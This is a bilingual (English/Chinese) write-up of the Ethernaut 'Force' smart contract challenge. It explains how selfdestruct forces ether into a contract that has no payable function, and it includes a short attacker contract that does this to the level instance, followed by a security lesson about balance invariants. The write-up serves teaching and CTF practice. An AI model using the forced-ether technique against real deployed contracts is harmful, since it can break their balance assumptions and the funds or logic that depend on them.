```
Some contracts will simply not take your money ¯\_(ツ)_/¯

The goal of this level is to make the balance of the contract greater than zero.

  Things that might help:

Fallback methods
Sometimes the best way to attack a contract is with another contract.
See the "?" page above, section "Beyond the console"
```





```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force { /*
                   MEOW ?
         /\_/\   /
    ____/ o o \
    /~____  =ø= /
    (______)__m_m)
                   */ }
```



我也只能缓缓打出一个问号❓





本關基本上不是很了解以太坊內部機制的很難一時之間想到答案，但要是知道答案了就很簡單，就是使用[selfdestruct](https://docs.soliditylang.org/en/v0.8.1/units-and-global-variables.html#contract-related)把以太幣強行送進合約。selfdestruct(address payable recipient)這個函數會在移除呼叫合約的同時強行把當前合約剩餘的以太幣傳送到指定地址，不論該地址有否定義payable或fallback。



```
selfdestruct(address payable recipient)
```

Destroy the current contract, sending its funds to the given [Address](https://docs.soliditylang.org/en/v0.8.1/types.html#address) and end execution. Note that `selfdestruct` has some peculiarities inherited from the EVM:

- the receiving contract’s receive function is not executed.
- the contract is only really destroyed at the end of the transaction and `revert` s might “undo” the destruction.





所以：注意levelInstance要用 payable修饰

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Force{
    address payable levelInstance;
    constructor(address payable _levelInstance) public {
        levelInstance = _levelInstance;
    }
    function claim() public payable 
        {
            selfdestruct(levelInstance);
        }
}
```



deploy的时候不用传value，claim的时候传1 wei的value。

![image-20250301225340501](./Force/images/image-20250301225340501.png)



In solidity, for a contract to be able to receive ether, the fallback function must be marked `payable`.

However, there is no way to stop an attacker from sending ether to a contract by self destroying. Hence, it is important not to count on the invariant `address(this).balance == 0` for any contract logic.





确实，硬要给还真防不住。。。